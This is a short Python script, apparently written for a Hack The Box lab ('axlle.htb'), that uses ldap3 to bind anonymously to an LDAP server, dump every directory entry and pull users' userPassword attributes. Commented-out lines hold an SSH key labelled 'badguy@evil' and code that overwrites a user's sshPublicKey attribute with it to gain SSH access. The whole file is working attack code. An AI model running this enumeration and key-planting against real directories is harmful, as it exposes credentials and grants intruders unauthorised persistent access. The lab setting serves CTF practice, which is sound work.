import ldap3
import sys

IP = sys.argv[1]

#server_636 = ldap3.Server(IP, get_info=ldap3.ALL, port =636, use_ssl = True)
#connection1 = ldap3.Connection(server_636)
#connection1.bind()
#print (server_636.info)

server_389 = ldap3.Server(IP, get_info=ldap3.ALL, port =389, use_ssl = False)
connection2 = ldap3.Connection(server_389)
connection2.bind()
print (server_389.info)


SEARCH_BASE='DC=axlle,DC=htb'

#connection1.search(search_base=SEARCH_BASE, search_filter='(&(objectClass=*))', search_scope='SUBTREE', attributes='*')
#print (connection1.entries)
#connection1.search(search_base=SEARCH_BASE, search_filter='(&(objectClass=person))', search_scope='SUBTREE', attributes='userPassword')
#print (connection1.entries)

connection2.search(search_base=SEARCH_BASE, search_filter='(&(objectClass=*))', search_scope='SUBTREE', attributes='*')
print (connection2.entries)
connection2.search(search_base=SEARCH_BASE, search_filter='(&(objectClass=person))', search_scope='SUBTREE', attributes='userPassword')
print (connection2.entries)

#key_pub = 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHRMu2et/B5bUyHkSANn2um9/qtmgUTEYmV9cyK1buvrS+K2gEKiZF5pQGjXrT71aNi5VxQS7f+s3uCPzwUzlI2rJWFncueM1AJYaC00senG61PoOjpqlz/EUYUfj6EUVkkfGB3AUL8z9zd2Nnv1kKDBsVz91o/P2GQGaBX9PwlSTiR8OGLHkp2Gqq468QiYZ5txrHf/l356r3dy/oNgZs7OWMTx2Rr5ARoeW5fwgleGPy6CqDN8qxIWntqiL1Oo4ulbts8OxIU9cVsqDsJzPMVPlRgDQesnpdt4cErnZ+Ut5ArMjYXR2igRHLK7atZH/qE717oXoiII3UIvFln2Ivvd8BRCvgpo+98PwN8wwxqV7AWo0hrE6dqRI7NC4yYRMvf7H8MuZQD5yPh2cZIEwhpk7NaHW0YAmR/WpRl4LbT+o884MpvFxIdkN1y1z+35haavzF/TnQ5N898RcKwll7mrvkbnGrknn+IT/v3US19fPJWzl1/pTqmAnkPThJW/k= badguy@evil'

#connection1 = ldap3.Connection(server_636, 'uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN', 'PASSWORD', auto_bind=True)
#connection1.bind()
#connection1.extend.standard.who_am_i()
#connection1.modify('uid=USER,ou=USERS,dc=DOMAINM=,dc=DOMAIN',{'sshPublicKey': [(ldap3.MODIFY_REPLACE, [key_pub])]})

#connection2 = ldap3.Connection(server_389, 'uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN', 'PASSWORD', auto_bind=True)
#connection2.bind()
#connection2.extend.standard.who_am_i()
#connection2.modify('uid=USER,ou=USERS,dc=DOMAINM=,dc=DOMAIN',{'sshPublicKey': [(ldap3.MODIFY_REPLACE, [key_pub])]})
